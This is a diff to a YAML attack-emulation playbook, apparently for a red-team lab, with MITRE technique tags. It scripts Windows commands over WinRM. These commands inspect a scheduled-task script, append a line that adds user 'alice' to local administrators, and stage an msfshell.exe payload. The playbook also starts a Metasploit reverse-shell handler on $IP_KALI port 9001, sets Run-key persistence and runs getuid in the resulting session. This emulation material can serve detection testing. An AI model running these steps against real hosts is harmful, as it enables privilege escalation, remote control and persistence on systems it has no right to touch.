@@ -25,6 +25,21 @@ commands:
   - type: shell
     session: winrm_domain_user
     interactive: true
+    cmd: "type C:\\Scripts\\Logger.ps1\n"
+
+  - type: shell
+    session: winrm_domain_user
+    interactive: true
+    cmd: "type C:\\Scripts\\userlog.log -Tail 15\n"
+
+  - type: shell
+    session: winrm_domain_user
+    interactive: true
+    cmd: "schtasks /query\n"
+
+  - type: shell
+    session: winrm_domain_user
+    interactive: true
     cmd: "Add-Content -Path \"C:\\Scripts\\Logger.ps1\" -Value \"net localgroup administrators alice /add\"\n"
     metadata:
       techniques: "T1053.005"
@@ -42,6 +57,16 @@ commands:
     format: exe
     local_path: $PAYLOADS_DIR/msfshell.exe
 
+  - type: msf-module
+    creates_session: msfshell_local_admin
+    cmd: exploit/multi/handler
+    payload: $MSF_PAYLOAD
+    payload_options:
+      LHOST: $IP_KALI
+      LPORT: "9001"
+    background: true
+    kill_on_exit: true
+
   - type: shell
     session: winrm_domain_user
     interactive: true
@@ -56,16 +81,6 @@ commands:
       tactics: "Persistence"
       technique_name: "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
 
-  - type: msf-module
-    creates_session: msfshell_local_admin
-    cmd: exploit/multi/handler
-    payload: $MSF_PAYLOAD
-    payload_options:
-      LHOST: $IP_KALI
-      LPORT: "9001"
-    background: true
-    kill_on_exit: true
-
   - type: shell
     session: winrm_domain_user
     interactive: true
@@ -73,7 +88,7 @@ commands:
 
   - type: msf-session
     session: msfshell_local_admin
-    cmd: getuid
+    cmd: "getuid"
 
   - type: msf-session
     session: msfshell_local_admin
